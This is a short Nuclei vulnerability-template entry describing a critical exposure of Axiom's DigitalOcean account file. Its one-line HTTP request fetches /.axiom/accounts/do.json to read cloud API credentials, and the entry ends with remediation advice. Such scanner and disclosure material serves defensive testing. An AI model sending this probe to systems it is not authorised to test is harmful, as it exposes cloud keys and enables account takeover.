# Nuclei Template: DigitalOcean Key Exposure via Axiom
**Template ID:** axiom-digitalocean-key-exposure
**Vulnerability Class:** Forced Browsing
**Severity:** Critical
**CWE:** CWE-425
**Source:** Nuclei Template (`axiom-digitalocean-key-exposure.yaml`)

## Vulnerability Information & PoC

## Description
Axiom is a dynamic infrastructure framework to efficiently work with multi-cloud environments.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/.axiom/accounts/do.json
```

## Remediation
Restrict access to the do.json file or upgrade to a newer version of Axiom

## References
- https://github.com/pry0cc/axiom
